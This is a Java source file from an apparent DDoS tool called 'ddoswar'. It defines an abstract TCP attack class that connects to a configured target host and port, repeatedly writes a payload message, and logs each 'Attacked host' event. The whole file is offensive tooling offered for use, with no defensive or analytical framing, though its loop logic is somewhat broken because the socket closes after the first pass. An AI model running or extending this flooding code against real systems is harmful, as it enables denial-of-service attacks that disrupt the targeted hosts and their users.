package ua.cc.lajdev.ddoswar.protocols.interfaces;

import ua.cc.lajdev.ddoswar.DDOSPattern;
import ua.cc.lajdev.ddoswar.DDOSer;

import java.io.IOException;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketException;
import java.net.UnknownHostException;

/**
 * This is the TCP implementation of the DDOS.
 *
 * @author Tobias
 * <p>
 * Last changed: 13.05.2015
 */
public abstract class TCP extends DDOS {
    /**
     * Instance of the current socket.
     */
    private Socket socket;

    /**
     * Constructor.
     * Create a TCP DDOS with a specified DDOS Pattern.
     *
     * @param ddosPattern
     */
    public TCP(DDOSPattern ddosPattern) {
        super(ddosPattern);
    }

    /**
     * This is the "main" method.
     * The whole action happens here.
     * - Open the socket
     * - Connect the socket
     * - Write something to the socket
     * - Close the socket
     */
    @Override
    public void run() {
        createSocket();
        connectToSocket();
        while (!Thread.currentThread().isInterrupted() && (socket.isConnected() && !socket.isClosed()) && DDOSer.stopThread != true) {
            writeLineToSocket(getDdosPattern().getMessage());
            DDOSer.appendToConsole("Attacked host " + getDdosPattern().getHost() + ":" + getDdosPattern().getPort());
            try {
                Thread.sleep(getDdosPattern().getTimeout());
            } catch (InterruptedException ex) {
                ex.getCause();
            } finally {
                closeSocket();
            }
        }
    }

    /**
     * This method creates the socket.
     */
    protected void createSocket() {
        setAddress(new InetSocketAddress(getDdosPattern().getHost(), getDdosPattern().getPort()));
        socket = new Socket();
        try {
            socket.setKeepAlive(true);
            socket.setSoTimeout(getDdosPattern().getSocketTimeout());
        } catch (SocketException ex) {
            ex.getCause();
        }
    }

    /**
     * This method writes something (Protocol dependent) to the socket.
     *
     * @param message
     */
    public abstract void writeLineToSocket(String message);

    protected void connectToSocket() {
        try {
            if (socket != null) socket.connect(getAddress());
        } catch (UnknownHostException ex) {
//            DDOSer.appendToConsole("Error: Host " + getAddress() + " doesn´t exist!");
            ex.getCause();
        } catch (SocketException ex) {
//            DDOSer.appendToConsole("Error while creating or accessing a Socket!");
            closeSocket();
            ex.getCause();
        } catch (IOException ex) {
//            DDOSer.appendToConsole("Error while connecting a Socket!");
//            closeSocket();
            ex.getCause();
        }
    }

    /**
     * Close the socket
     */
    protected void closeSocket() {
        try {
            if (socket != null && !socket.isClosed() && socket.isBound()) {
                socket.close();
            }
        } catch (IOException ex) {
            ex.getCause();
        }
    }

    /**
     * Get the socket
     *
     * @return
     */
    public Socket getSocket() {
        return socket;
    }

    /**
     * Set the socket
     *
     * @param socket
     */
    public void setSocket(Socket socket) {
        this.socket = socket;
    }
}
